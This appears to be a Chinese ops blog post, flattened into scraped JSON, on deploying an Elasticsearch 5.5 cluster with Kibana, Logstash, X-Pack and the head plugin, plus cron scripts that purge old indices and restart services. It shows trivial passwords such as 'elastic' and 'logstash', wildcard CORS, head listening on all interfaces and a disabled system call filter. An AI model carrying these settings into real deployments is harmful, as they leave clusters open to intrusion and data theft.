http://10.11.10.26:9200/_cat/master?helpid | | node idhost | h | host nameip | | ip addressnode | n | node name 查看所有连接的索引： 12345678910[elasticsearch@logstash ~]$ curl -sXGET \"http://$(hostname):9200/_cat/indices?v\"health status index uuid pri rep docs.count docs.deleted store.size pri.store.sizeyellow open log-wms31-web-product-2017.08.25 LIKJyNXrRcmQSt8aXRoyLg 5 1 614 0 361.6kb 361.6kbyellow open log-payment-center-product-2017.08.26 w-ucGJUoTDOdhEkfrq9g-g 5 1 1712756 0 808.4mb 808.4mbyellow open .kibana p9MnvKHRS6K_jCeBtB7CXA 1 1 18 1 77.8kb 77.8kbyellow open log-jcm-product-2017.08.25 Cs0XHa-xRQOHxt1-HYz1Xw 5 1 46303455 0 8.1gb 8.1gbyellow open log-spm_mq-product-2017.08.25 FXYNV08zQselbnVKK7k01g 5 1 465127 0 148.1mb 148.1mbyellow open log-erpsearchservice-product-2017.08.26 Z4ECtHCJS2uma_UTxJqDLw 5 1 2217 0 15.3mb 15.3mbyellow open log-wms31-web-product-2017.08.24 mYAhjM5UQFyIZAN8nFeYQQ 5 1 951572 0 237.5mb 237.5mbyellow open log-spm_mq-product-2017.08.26 -PJCMMVqRwWXux8V5SRbCA 5 1 1457469 0 503.1mb 503.1mb 删除指定索引： 1curl -XDELETE \"http://$(hostname):9200/log-wms-product-2017.08.19\" 注意✨✨ ： 你可能已经注意到在上面的结果中，状态被标记为危险的黄色，而不是安全的绿色。实际上我们的安装步骤没有问题，之所以会显示黄色，实际上是因为从集群的角度看，这个集群目前只有一个节点，数据有丢失的风险。不过如果我们只是在一些安全性要求不太高的项目上使用，那么一个节点是可以接受的。二、Elasticsearch集群node2部署1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859curl -L -O https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-5.5.2.tar.gztar -xvf elasticsearch-5.5.2.tar.gzcd /usr/local/elasticsearch-5.5.2/binuseradd elasticsearch chown -R /usr/local/elasticsearch-5.5.2/su - elasticsearch -c \"/usr/local/elasticsearch-5.5.2/bin/elasticsearch -d\"这里我切换普通es用户启动，记得给予权限。mkdir /data/es-jollychic vim config/jvm.options 修改内存优化-Xms6g-Xmx6g-XX:+UseConcMarkSweepGC-XX:CMSInitiatingOccupancyFraction=75-XX:+UseCMSInitiatingOccupancyOnly-XX:+AlwaysPreTouch修改elasticsearch.yml配置[elasticsearch@logstash elasticsearch-5.5.2]$ cat config/elasticsearch.yml | grep -Pv \"^$|^#\"cluster.name: jolly-clusternode.master: falsenode.data: truenode.name: es-jollychic-node2path.data: /data/elasticsearch/es-datanetwork.host: 10.11.10.45,127.0.0.1bootstrap.memory_lock: falsebootstrap.system_call_filter: falsehttp.port: 9200discovery.zen.ping.unicast.hosts: [\"10.11.10.26\", \"10.11.10.45\"]查看启动进程服务:[root@logstash2 config]# netstat -ntulp | grep javatcp 0 0 ::ffff:10.11.10.45:9200 :::* LISTEN 18118/javatcp 0 0 ::ffff:127.0.0.1:9200 :::* LISTEN 18118/javatcp 0 0 ::ffff:10.11.10.45:9300 :::* LISTEN 18118/javatcp 0 0 ::ffff:127.0.0.1:9300 :::* LISTEN 18118/java查看集群中的节点列表：我们也可以得到我们单节点的列表如下：[root@es_01 data]# curl -XGET http://10.11.10.26:9200/_cat/nodes?vip heap.percent ram.percent cpu load_1m load_5m load_15m node.role master name10.11.10.45 40 98 23 5.90 4.75 4.75 di - es-jollychic-node210.11.10.26 54 97 42 2.32 2.60 2.95 mdi * es-jollychic-node1查看集群节点索引：[elasticsearch@logstash ~]$ curl -sXGET \"http://$(hostname):9200/_cat/indices?v\"health status index uuid pri rep docs.count docs.deleted store.size pri.store.sizegreen open log-wms31-web-product-2017.08.25 LIKJyNXrRcmQSt8aXRoyLg 5 1 614 0 361.6kb 361.6kbgreen open log-payment-center-product-2017.08.26 w-ucGJUoTDOdhEkfrq9g-g 5 1 1712756 0 808.4mb 808.4mbgreen open .kibana p9MnvKHRS6K_jCeBtB7CXA 1 1 18 1 77.8kb 77.8kbgreen open log-jcm-product-2017.08.25 Cs0XHa-xRQOHxt1-HYz1Xw 5 1 46303455 0 8.1gb 8.1gbgreen open log-spm_mq-product-2017.08.25 FXYNV08zQselbnVKK7k01g 5 1 465127 0 148.1mb 148.1mbgreen open log-erpsearchservice-product-2017.08.26 Z4ECtHCJS2uma_UTxJqDLw 5 1 2217 0 15.3mb 15.3mbgreen open log-wms31-web-product-2017.08.24 mYAhjM5UQFyIZAN8nFeYQQ 5 1 951572 0 237.5mb 237.5mbgreen open log-spm_mq-product-2017.08.26 -PJCMMVqRwWXux8V5SRbCA 5 1 1457469 0 503.1mb 503.1mb 1.1 Elasticsearch 5.x的Bootstrap ChecksElasticsearch在升级到5.x版本后，启动时会强制执行Bootstrap Checks(官方文档)其中经常性的问题是需要增大系统可使用的最大FileDescriptors数（参考https://www.elastic.co/guide/en/elasticsearch/reference/current/file-descriptors.html）剩下的其他问题可以查询官方文档。 1.2 Elasticsearch的X-pack插件X-pack是官方提供的一系列集成插件，包括了alert、monitor、secure等功能，十分强大（但是并不免费）。在ELK 5.0中安装大部分插件仅需要输入命令：./bin/elasticsearch-plugin install &lt;plugin name&gt;即可X-pack插件安装后会自动开启ELK的权限功能，需要注意的是如果启用了X-pack，则在向ES输入数据或发起API请求时，均需要附带相应的auth信息。考虑到X-pack并非免费且价格昂贵，暂时不安装X-pack包。 第一步：Elasticsearch安装 x-pack在 Elasticsearch 的根目录，运行 bin/elasticsearch-plugin 进行安装： 123456789101112131415161718192021222324252627282930[elasticsearch@logstash elasticsearch-5.5.2]$ ./bin/elasticsearch-plugin install x-pack-&gt; Downloading x-pack from elastic[=================================================] 100%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ WARNING: plugin requires additional permissions @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@* java.io.FilePermission \\\\.\\pipe\\* read,write* java.lang.RuntimePermission accessClassInPackage.com.sun.activation.registries* java.lang.RuntimePermission getClassLoader* java.lang.RuntimePermission setContextClassLoader* java.lang.RuntimePermission setFactory* java.security.SecurityPermission createPolicy.JavaPolicy* java.security.SecurityPermission getPolicy* java.security.SecurityPermission putProviderProperty.BC* java.security.SecurityPermission setPolicy* java.util.PropertyPermission * read,write* java.util.PropertyPermission sun.nio.ch.bugLevel write* javax.net.ssl.SSLPermission setHostnameVerifierSee http://docs.oracle.com/javase/8/docs/technotes/guides/security/permissions.htmlfor descriptions of what these permissions allow and the associated risks.Continue with installation? [y/N]y@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ WARNING: plugin forks a native controller @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@This plugin launches a native controller that is not subject to the Javasecurity manager nor to system call filters.Continue with installation? [y/N]y-&gt; Installed x-pack 服务启动后，我们可以通过 elasticsearch 提供的 API 来确认一下基本信息： 1234567891011121314shell&gt; curl http://localhost:9200/&#123; \"name\" : \"...\", \"cluster_name\" : \"...\", \"cluster_uuid\" : \"...\", \"version\" : &#123; \"number\" : \"...\", \"build_hash\" : \"...\", \"build_date\" : \"...\", \"build_snapshot\" : false, \"lucene_version\" : \"...\" &#125;, \"tagline\" : \"You Know, for Search\"&#125; 重启服务1su - elasticsearch -c \"/usr/local/elasticsearch-5.5.2/bin/elasticsearch -d 缺省情况下，elasticsearch 服务会监听9200端口，如果你想自定义监听地址和端口，那么可以设置 elasticsearch.yml 配置文件中的 network.host 和 http.port 选项。 elasticsearch服务推荐安装 x-pack 插件，它在安全监控等方面为 elasticsearch提供了完善的支持：访问地址：http://10.11.10.26:9200/?pretty 会发现在安装了 x-pack 之后访问受到限制：这里默认的用户名：elastic，密码：changeme 123456789101112131415[elasticsearch@logstash ~]$ curl -u elastic http://10.11.10.26:9200/Enter host password for user 'elastic':&#123; \"name\" : \"es-jollychic-node1\", \"cluster_name\" : \"jolly-cluster\", \"cluster_uuid\" : \"hxR0DDN7TTa3tNnYtMIbbA\", \"version\" : &#123; \"number\" : \"5.5.2\", \"build_hash\" : \"b2f0c09\", \"build_date\" : \"2017-08-14T12:33:14.154Z\", \"build_snapshot\" : false, \"lucene_version\" : \"6.6.0\" &#125;, \"tagline\" : \"You Know, for Search\"&#125; 不过使用缺省密码是不安全的，所以我们应该修改它,可以通过 curl 修改默认密码:elastic 123[elasticsearch@logstash ~]$ curl -XPUT -u elastic -d '&#123;\"password\": \"elastic\"&#125;' \\&gt; 'http://10.11.10.26:9200/_xpack/security/user/elastic/_password'Enter host password for user 'elastic': 启用和禁用启用和禁用X-Pack功能 默认情况下，所有X-Pack功能都被启用。您可以启用或禁用特定的X-Pack功能elasticsearch.yml，kibana.yml以及logstash.yml 配置文件。 1234567设置 描述xpack.graph.enabled 设置为false禁用X-Pack图形功能。xpack.ml.enabled 设置为false禁用X-Pack机器学习功能。xpack.monitoring.enabled 设置为false禁用X-Pack监视功能。xpack.reporting.enabled 设置为false禁用X-Pack报告功能。xpack.security.enabled 设置为false禁用X-Pack安全功能。xpack.watcher.enabled 设置false为禁用观察器。 第二步：Kibana 安装x-pack1234567891011[root@logstash ~]# /usr/local/kibana-5.5.2/bin/kibana-plugin install x-packAttempting to transfer from x-packAttempting to transfer from https://artifacts.elastic.co/downloads/kibana-plugins/x-pack/x-pack-5.5.2.zipTransferring 119363535 bytes....................Transfer completeRetrieving metadata from plugin archiveExtracting plugin archiveExtraction completeOptimizing and caching browser bundles...Plugin installation completeYou have new mail in /var/spool/mail/root 修改密码修改kibana密码：修改之前需要在kibana.yml中配置elasticsearch的用户名和密码后才能需改密码，否则会报错。 1234567891011121314# If your Elasticsearch is protected with basic authentication, these settings provide# the username and password that the Kibana server uses to perform maintenance on the Kibana# index at startup. Your Kibana users still need to authenticate with Elasticsearch, which# is proxied through the Kibana server.elasticsearch.username: \"elastic\"elasticsearch.password: \"your password\"## 查询所有用户[root@logstash config]# curl -XGET -u elastic:elastic '10.11.10.26:9200/_xpack/security/user?pretty'&#123; \"elastic\" : &#123; \"username\" : \"elastic\", \"roles\" : [ \"superuser\" Monitoring(免费版本只支持单 ES 集群)12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455集群级别：Uptime ： 集群运行时间；节点级别：Disk Available：可用磁盘；JVM Heap： JVM 使用情况；索引级别：Indices：索引数量，相当于数据库数；Documents：文档数量，相当于记录数；Disk Usage：磁盘使用情况；Primary Shards：分片数；Replica Shards：冗余分片数；Overview相较于集群健康视图，这里的指标更多：Serach Rate (/s)：近1小时的查询速率，QPS；Search Latency (ms)：近1小时的查询延迟；Index Rate (/s)：近1小时的索引速率，IPS；Index Latency (ms)：近1小时的索引延迟；Shard Activity：对于 Shard 的操作历史；Indices索引视角的监控视图，包含以下指标：Document Count：文档数；Data：数据量；Index Rate：索引速率；Search Rate：查询速率；Unassigned Shards：未分配的分片数；点击 Index Name 可以进入查看对于索引的详细基础监控：Index Memory (KB)：索引内存使用，分为 Lucene、Term、Points；Index Size (MB)：索引大小；Search Rate (/s)：查询速率；Indexing Rate (/s)：索引速率；Segment Count：段数；Document Count：文档数；Shard Legend：分片状态图谱，分为 Primary, Replica,Relocating,Initializing,Unassigned Primary,Unassigned Replica 多个状态。点击 Advanced 可以看到高级监控页面，请读者自己去感受下。Nodes节点监控，首先看到的是概述指标：CPU Usage: CPU 使用率；Load Average：CPU 平均负载；JVM Memory：JVM 使用情况；Disk Free Space：磁盘空闲空间；Shards：分片数；点击某个节点我们可以看到详细基础监控：JVM Heap (GB)：JVM 使用情况；Index Memory (KB)：索引占用内存；CPU Utilization (%)：CPU 使用率；System Load：系统负载；Latency (ms)：延迟，分为索引和查询；Segment Count：段数量；Shard Legend：分片状态图谱， Primary, Replica,Relocating,Initializing多个状态。 logstash 数据传输出现问题： 1Attempted to send a bulk request to Elasticsearch configured at '[\"http://10.11.10.26:9200\"]', but an error occurred and it failed! Are you sure you can reach elasticsearch from this machine using the configuration provided? &#123;:error_message=&gt;\"[401] &#123;\\\"error\\\":&#123;\\\"root_cause\\\":[&#123;\\\"type\\\":\\\"security_exception\\\",\\\"reason\\\":\\\"missing authentication token for REST request [/_bulk]\\\",\\\"header\\\":&#123;\\\"WWW-Authenticate\\\":\\\"Basic realm=\\\\\\\"security\\\\\\\" charset=\\\\\\\"UTF-8\\\\\\\"\\\"&#125;&#125;],\\\"type\\\":\\\"security_exception\\\",\\\"reason\\\":\\\"missing authentication token for REST request [/_bulk]\\\",\\\"header\\\":&#123;\\\"WWW-Authenticate\\\":\\\"Basic realm=\\\\\\\"security\\\\\\\" charset=\\\\\\\"UTF-8\\\\\\\"\\\"&#125;&#125;,\\\"status\\\":401&#125;\", :error_class=&gt;\"Elasticsearch::Transport::Tran 另外需要注意 x-pack 的授权一个月后会过期，此时查看 kibana 会显示： Login is disabled because your license has expired. Please extend your license or disable Security in Elasticsearch. 此时可以重新获取一个授权，比如免费版授权，但是功能有阉割。更新授权的时候，可能会发现更新不会被确认，这是因为需要加上 acknowledge=true 参数。使用免费授权的后遗症就是基本的安全性没有了，可以用 Nginx 代理做一个HTTP Basic认证来弥补. 访问效果： 登录需要输入认证密码统一：Username：elastic password：elastic JVM堆，索引内存（KB），CPU利用率（％），系统负载，延迟（ms）等等 1.3 Elasticsearch的Head插件Head插件作为ELK 2.x版本中较为通用的前端管理插件，在ELK 5.x版本中无法直接使用./bin/elasticsearch-plugin install head的方式安装，但是可以采取standalone的方式进行运行。 参考官方文档：elasticsearch-head 一篇较好的ES 5.x安装Head的博文： 【特别注意】：暂时没有找到x-pack和head相互兼容的方法，目前由于认证的问题，如果启用了x-pack的secure功能，会导致head插件无法连接ES集群。 12345git clone git://github.com/mobz/elasticsearch-head.gitcd elasticsearch-headnpm installnpm run startopen http://localhost:9100/ 修改head目录下的Gruntfile.js配置，head默认监听127.0.0.1 新增：hostname: ‘0.0.0.0’ 12345678910111213# vim Gruntfile.js connect: &#123; server: &#123; options: &#123; hostname: '0.0.0.0', port: 9100, base: '.', keepalive: true &#125; &#125; &#125; &#125;); 修改elasticsearch配置文件 elasticsearch.yml 12http.cors.enabled: truehttp.cors.allow-origin: \"*\" 重启elasticsearch，并启动node 123ln -s /usr/local/elasticsearch-head/node_modules/grunt/bin/grunt /usr/bin/grunt后台启动：grunt server &amp; 访问效果： 三、 Elasticsearch-KibanaRPM方法安装参考官网文档：使用RPM 编辑安装Kibana Running Kibana on Docker: Docker 搭建方法 tar方式安装Kibana 1234wget https://artifacts.elastic.co/downloads/kibana/kibana-5.5.2-linux-x86_64.tar.gzsha1sum kibana-5.5.2-linux-x86_64.tar.gz tar -xzf kibana-5.5.2-linux-x86_64.tar.gzcd kibana/ 1.1 通过配置文件编辑配置Kibanakibana.yml启动时Kibana服务器从文件读取属性。默认设置配置Kibana运行localhost:5601。要更改主机或端口号，或者连接到在其他机器上运行的Elasticsearch，您需要更新kibana.yml文件。您还可以启用SSL并设置各种其他选项。 kibana.yml 全部基本配置 ： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171server.port:默认值：5601 Kibana由后端服务器提供服务。此设置指定要使用的端口。server.host:默认值：“localhost”此设置指定后端服务器的主机。server.basePath:如果您在代理服务器后面运行，则允许您指定安装Kibana的路径。这仅影响由Kibana生成的URL，您的代理预期在将请求转发给Kibana之前删除basePath值。此设置无法以斜杠（/）结尾。server.maxPayloadBytes:默认值：1048576传入服务器请求的最大有效负载大小（以字节为单位）。server.name:默认值：“your-hostname”用于标识此Kibana实例的人性化显示名称。server.defaultRoute:默认值：“/ app / kibana”此设置指定打开Kibana时的默认路由。打开Kibana时，您可以使用此设置修改着陆页。elasticsearch.url:默认值：“http：// localhost：9200”用于所有查询的Elasticsearch实例的URL。elasticsearch.preserveHost:默认值：true当此设置的值为真时，Kibana使用server.host设置中指定的主机名。当此设置的值为false，Kibana使用连接到此Kibana实例的主机的主机名。kibana.index:默认：“.kibana” Kibana使用Elasticsearch中的索引来存储已保存的搜索，可视化和仪表板。如果索引不存在，Kibana将创建一个新的索引。kibana.defaultAppId:默认值：“discover”要加载的默认应用程序。tilemap.url:Kibana用于在tilemap可视化中显示地图图块的tile服务的URL。默认情况下，Kibana从外部元数据服务读取此URL，但用户仍然可以覆盖此参数以使用自己的Tile Map Service。例如：\"https://tiles.elastic.co/v2/default/&#123;z&#125;/&#123;x&#125;/&#123;y&#125;.png?elastic_tile_service_tos=agree&amp;my_app_name=kibana\"tilemap.options.minZoom:默认值：1最小缩放级别。tilemap.options.maxZoom:默认值：10最大缩放级别。tilemap.options.attribution:默认值：\"© [Elastic Maps Service](https://www.elastic.co/elastic-maps-service)\"地图属性字符串。regionmap指定用于区域映射可视化的其他矢量图层。每个层对象都指向一个外部矢量文件，其中包含一个geojson FeatureCollection。该文件必须使用WGS84坐标参考系，并且只包括多边形。如果文件托管在与Kibana不同的域上，则服务器需要启用CORS，因此Kibana可以下载该文件。url字段也用作文件的唯一标识符。每个图层可以包含多个字段，以指示要公开的geojson要素的哪些属性。field.description是在Region Map可视化的字段菜单中显示的人类可读文本。也可以添加可选的归因值。以下示例显示有效的regionmap配置。regionmap： 层： - 名称：“法国部” url：“http://my.cors.enabled.server.org/france_departements.geojson” 归因：“INRAP” 字段： - 名称：“部门” 说明：“全部名称” - 名称：“INSEE” 说明：“INSEE数字标识符”elasticsearch.username: 和 elasticsearch.password:如果您的Elasticsearch受到基本身份验证的保护，这些设置将提供Kibana服务器在启动时对Kibana索引执行维护所用的用户名和密码。您的Kibana用户仍然需要使用通过Kibana服务器代理的Elasticsearch进行身份验证。server.ssl.enabled默认值：“false”启用从Kibana服务器到浏览器的传出请求的SSL。当设置为true，server.ssl.certificate并server.ssl.key要求server.ssl.certificate: 和 server.ssl.key:路由到PEM格式的SSL证书和SSL密钥文件。server.ssl.keyPassphrase将用于解密私钥的密码短语。该值是可选的，因为密钥可能未被加密。server.ssl.certificateAuthorities列出可信赖的PEM编码证书文件的路径。server.ssl.supportedProtocols默认值：TLSv1，TLSv1.1，TLSv1.2 支持的版本协议。有效协议：TLSv1，TLSv1.1，TLSv1.2server.ssl.cipherSuites默认值：ECDHE-RSA-AES128-GCM-SHA256，ECDHE-ECDSA-AES128-GCM-SHA256，ECDHE-RSA-AES256-GCM-SHA384，ECDHE-ECDSA-AES256-GCM-SHA384，DHE-RSA-AES128-GCM- SHA256，ECDHE-RSA-AES128-SHA256，DHE-RSA-AES128-SHA256，ECDHE-RSA-AES256-SHA384，DHE-RSA-AES256-SHA384，ECDHE-RSA-AES256-SHA256，DHE-RSA-AES256-SHA256， HIGH，！aNULL，！eNULL，！EXPORT，！DES，！RC4，！MD5，！PSK，！SRP，！CAMELLIA。格式和有效选项的详细信息可通过[OpenSSL密码列表格式文档]（ https://www.openssl.org/docs/man1.0.2/apps/ciphers.html#CIPHER-LIST-FORMAT）获得。elasticsearch.ssl.certificate: 和 elasticsearch.ssl.key:提供PEM格式SSL证书和密钥文件路径的可选设置。这些文件验证您的Elasticsearch后端使用相同的密钥文件。elasticsearch.ssl.keyPassphrase将用于解密私钥的密码短语。该值是可选的，因为密钥可能未被加密。elasticsearch.ssl.certificateAuthorities:可选设置，使您能够指定Elasticsearch实例的证书颁发机构的PEM文件的路径列表。elasticsearch.ssl.verificationMode:默认值：full控制证书的验证。有效值是none，certificate和full。 full执行主机名验证，certificate不执行。elasticsearch.pingTimeout:默认值：elasticsearch.requestTimeout设置时间（以毫秒为单位）等待弹性搜索响应ping的值。elasticsearch.requestTimeout:默认值：30000等待后端或弹性搜索的响应的时间（毫秒）。该值必须为正整数。elasticsearch.requestHeadersWhitelist:默认值：[ 'authorization' ]要发送到Elasticsearch的Kibana客户端标题列表。要发送没有客户端标题，请将此值设置为[]（空列表）。elasticsearch.customHeaders:默认值：&#123;&#125;要发送到Elasticsearch的标题名称和值。无论elasticsearch.requestHeadersWhitelist配置如何，客户端头都不能覆盖任何自定义头文件。elasticsearch.shardTimeout:默认值：0 Elasticsearch等待分片响应的时间（以毫秒为单位）。设置为0以禁用。elasticsearch.startupTimeout:默认值：5000重试之前等待Kibana启动时的弹性搜索的时间（以毫秒为单位）。pid.file:指定Kibana创建进程ID文件的路径。logging.dest:默认值：stdout允许您指定Kibana存储日志输出的文件。logging.silent:默认值：false将此设置的值设置true为禁止所有日志输出。logging.quiet:默认值：false将此设置的值设置true为禁止除错误消息之外的所有日志输出。logging.verbose默认值：false将此设置的值设置为true记录所有事件，包括系统使用情况信息和所有请求。ops.interval默认值：5000设置采样系统和进程性能指标的间隔（以毫秒为单位）。最小值为100。status.allowAnonymous默认值：false如果启用了身份验证，true请将其设置为允许未经身份验证的用户访问Kibana服务器状态API和状态页面。cpu.cgroup.path.override覆盖cgroup cpu路径，以不一致的方式安装 /proc/self/cgroupcpuacct.cgroup.path.override在与不一致的方式安装时，覆盖cgroup cpuacct路径 /proc/self/cgroupconsole.enabled默认值：true设置为false以禁用控制台。切换此操作将导致服务器在下次启动时重新生成资源，这可能会在页面开始投放之前造成延迟。elasticsearch.tribe.url:用于所有查询的Elasticsearch部落实例的可选URL。elasticsearch.tribe.username: 和 elasticsearch.tribe.password:如果您的Elasticsearch受到基本身份验证的保护，这些设置将提供Kibana服务器在启动时对Kibana索引执行维护所用的用户名和密码。您的Kibana用户仍然需要使用通过Kibana服务器代理的Elasticsearch进行身份验证。elasticsearch.tribe.ssl.certificate: 和 elasticsearch.tribe.ssl.key:提供PEM格式SSL证书和密钥文件路径的可选设置。这些文件验证您的Elasticsearch后端使用相同的密钥文件。elasticsearch.tribe.ssl.keyPassphrase将用于解密私钥的密码短语。该值是可选的，因为密钥可能未被加密。elasticsearch.tribe.ssl.certificateAuthorities:可选设置，使您能够为您的部落Elasticsearch实例的证书颁发机构指定PEM文件的路径。elasticsearch.tribe.ssl.verificationMode:默认值：full控制证书的验证。有效值是none，certificate和full。full执行主机名验证，certificate不执行。elasticsearch.tribe.pingTimeout:默认值：elasticsearch.tribe.requestTimeout设置时间（以毫秒为单位）等待弹性搜索响应ping的值。elasticsearch.tribe.requestTimeout:默认值：30000等待后端或弹性搜索的响应的时间（毫秒）。该值必须为正整数。elasticsearch.tribe.requestHeadersWhitelist:默认值：[ 'authorization' ]要发送到Elasticsearch的Kibana客户端标题列表。要发送没有客户端标题，请将此值设置为[]（空列表）。elasticsearch.tribe.customHeaders:默认值：&#123;&#125;要发送到Elasticsearch的标题名称和值。无论elasticsearch.tribe.requestHeadersWhitelist配置如何，客户端头都不能覆盖任何自定义头文件。 根据不同的需求配置： 1234567[root@logstash config]# cat kibana.yml | grep -Pv \"^#|^$\"server.port: 5601server.host: \"10.11.10.26\"server.name: \"jollychic-log\"elasticsearch.url: \"http://10.11.10.26:9200\"elasticsearch.preserveHost: truekibana.index: \".kibana\" 配置好配置，启动服务：./bin/kibana &amp; 后台启动 1.2 访问Kibana 检查Kibana状态 您可以通过导航到达Kibana服务器的状态页面localhost:5601/status。状态页面显示有关服务器资源使用情况的信息，并列出已安装的插件。 http://10.11.10.26:5601/status 配置索引模式指定与一个或多个弹性搜索索引的名称相匹配的索引模式。默认情况下，Kibana猜测您正在使用由Logstash提供给Elasticsearch的数据。如果是这样，您可以使用默认值logstash-作为索引模式。星号（）匹配索引名称中的零个或多个字符。如果您的弹性搜索索引遵循其他命名约定，请输入适当的模式。“模式”也可以简单地是单个索引的名称。选择包含要用于执行基于时间的比较的时间戳的索引字段。Kibana读取索引映射以列出包含时间戳的所有字段。如果您的索引没有基于时间的数据，请禁用索引包含基于时间的事件选项。 选择索引查看日志 官网中在生产环境中使用Kibana 说的很详细：在生产环境中使用Kibana 上面是我logstash已经搭建配置好索引才能获取到。下面讲如何部署logstash 四、Logstash的部署与Elasticsearch类似，在官网下载压缩包后，解压即可用。 在非高级场景下，Logstash本身不需要进行太多的配置（配置文件在logstash根目录下的./config/logstash.yml），高级场景请参考官方文档。logstash的启动命令为:./bin/logstash -f &lt;pipeline_conf_file&gt; --config.reload.automatic，其中-f指定了pipeline配置文件的位置，--config.reload.automatic指定了pipeline配置文件可以进行热加载。本次我们使用Logstash作为日志解析模块（Logstash其实也可以作为日志采集器），重点需要配置pipeline的三大部分：input、filter和output。pipeline文件需要自己创建。 Installing Logstash1234567891011121314151617java version \"1.8.0_65\"Java(TM) SE Runtime Environment (build 1.8.0_65-b17)Java HotSpot(TM) 64-Bit Server VM (build 25.65-b01, mixed mode)rpm --import https://artifacts.elastic.co/GPG-KEY-elasticsearchvim /etc/yum.repos.d/logstash.repo[logstash-5.x]name=Elastic repository for 5.x packagesbaseurl=https://artifacts.elastic.co/packages/5.x/yumgpgcheck=1gpgkey=https://artifacts.elastic.co/GPG-KEY-elasticsearchenabled=1autorefresh=1type=rpm-mdsudo yum install logstash 首先，我们通过运行最基本的Logstash管道来测试您的Logstash安装。 Logstash管道有两个必需的元素，input并且output，和一个可选的元素，filter。输入插件消耗来自源的数据，过滤器插件会按照您指定的方式修改数据，并且输出插件将数据写入到目的地。 要测试您的Logstash安装，运行最基本的Logstash管道。例如： 12cd logstash-5.5.2bin / logstash -e'input &#123;stdin &#123;&#125;&#125; output &#123;stdout &#123;&#125;&#125;' 该-e标志使您能够直接从命令行指定配置。在命令行中指定配置可以快速测试配置，而无需在迭代之间编辑文件。示例中的流水线从标准输入端输入，stdin并stdout以结构化格式将该输入移动到标准输出 。 启动Logstash后，等到看到“Pipeline main started”，然后hello world在命令提示符下输入： 12hello world2017-07-21T01:22:14.405+0000 0.0.0.0 hello world Logstash将时间戳和IP地址信息添加到消息中。通过在运行Logstash的shell中发出CTRL-D命令退出Logstash 。 logstash的配置片段： 1234567891011121314151617181920#character at the beginning of a line indicates a comment. Use# comments to describe your configuration.input &#123; udp &#123; port =&gt; 25826 buffer_size =&gt; 1452 workers =&gt; 3 # Default is 2 queue_size =&gt; 30000 # Default is 2000 &#125;&#125;output &#123; elasticsearch &#123; hosts =&gt; [ \"10.11.10.26:9200\" ] user =&gt; logstash password =&gt; logstash &#125;&#125; ☺待整理续写~~ *更新自动化搭建es集群，架构梳理详解-与实现es监控服务 Communicative learning:🐧 Linux shell_ senior operation and maintenance faction: QQ group 459096184 circle (system operation and maintenance - application operation and maintenance - automation operation and maintenance - virtualization technology research, welcome to join)🐧 BigData-Exchange School:QQ group 521621407 circles (big data Yun Wei) (Hadoop developer) (big data research enthusiasts) welcome to join Bidata have internal WeChat exchange group, learn from each other, join QQ group has links.","link":"/2017/05/11/日志分析\u0010平台/Elasticsearch/ElasticStack 5.x集群+Kibana-5.5.x+Logstash5.5+kafka2.10版本部署概述/"},{"title":"Elasticsearch5.x版本的索引定时自动清理和检测进程状态自动启动","text":"elasticsearch的索引定时自动清理之前用 logstash来做日志收集 并用 elasticsearch来搜索，因为日志没有进行过滤，没几天就发现elasticsearch的索引文件大的吓人，之前还真没清理过。其实要说清理也简单，直接到 elasticsearch data文件夹里删掉就行了，写个脚本定期清理集群es的日志数据。 这里我清理1月7号的。 这里后面是索引名称。app_error-2017.01.07 12[root@es_01 sh]# curl -XDELETE 'http://10.47.88.206:9200/app_error-2017.01.07'&#123;\"acknowledged\":true&#125;[root@es_01 sh]# shell 7天清理一次数据写在计划任务里面： 12345678#!/bin/bashnow=`date +%Y%m%d`echo $nowdays_07_before=`date -d \"$now 7 days ago\" +%Y.%m.%d`echo $days_07_beforecurl -XDELETE \"http://$(hostname):9200/log-spm-product-$days_07_before\" &gt; /dev/null 2&gt;&amp;1curl -XDELETE \"http://$(hostname):9200/log-dataexport-product-$days_07_before\" &gt; /dev/null 2&gt;&amp;1 计划任务： 110 0 * * * /opt/sh/logstash-null.sh 官网：检查状态是否存在 12345678910111213141516检查文档是否存在编辑如果只想检查一个文档是否存在 --根本不想关心内容--那么用 HEAD 方法来代替 GET 方法。 HEAD 请求没有返回体，只返回一个 HTTP 请求报头：curl -i -XHEAD http://localhost:9200/website/blog/123如果文档存在， Elasticsearch 将返回一个 200 ok 的状态码：HTTP/1.1 200 OKContent-Type: text/plain; charset=UTF-8Content-Length: 0若文档不存在， Elasticsearch 将返回一个 404 Not Found 的状态码：curl -i -XHEAD http://localhost:9200/website/blog/124HTTP/1.1 404 Not FoundContent-Type: text/plain; charset=UTF-8Content-Length: 0当然，一个文档仅仅是在检查的时候不存在，并不意味着一毫秒之后它也不存在：也许同时正好另一个进程就创建了该文档。 自动检测es端口状态如何不存在启动12345vim /bin/whole51/es_poss.sh#!/bin/bashsource /etc/profilecurl -Is \"10.11.10.26:9200\" | grep -q 'HTTP/1.1 200 OK' || su - elasticsearch -c \"/usr/local/elasticsearch-5.5.2/bin/elasticsearch -d\"curl -Is \"10.11.10.26:5601\" | grep -q 'HTTP/1.1 200 OK' || /usr/local/kibana-5.5.2/bin/kibana &amp; 1*/2 * * * * /bin/whole51/es.sh Communicative learning:🐧 Linux shell_ senior operation and maintenance faction: QQ group 459096184 circle (system operation and maintenance - application operation and maintenance - automation operation and maintenance - virtualization technology research, welcome to join)🐧 BigData-Exchange School:QQ group 521621407 circles (big data Yun Wei) (Hadoop developer) (big data research enthusiasts) welcome to join Bidata have internal WeChat exchange group, learn from each other, join QQ group has 